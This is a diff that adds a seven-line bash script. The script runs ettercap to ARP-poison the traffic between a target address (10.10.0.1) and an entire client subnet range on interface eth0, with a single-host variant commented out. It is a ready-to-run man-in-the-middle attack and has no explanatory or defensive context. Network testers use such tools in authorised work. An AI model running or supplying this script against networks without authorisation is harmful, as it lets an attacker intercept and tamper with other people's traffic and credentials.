@@ -1,0 +1,7 @@
+#! /usr/bin/bash
+
+IF="eth0"
+TARGET="10.10.0.1"
+CLIENTS="10.10.1-255.1-255"
+#CLIENTS="10.10.1.8"
+ettercap -Tqi $IF -M ARP /$TARGET// /$CLIENTS//
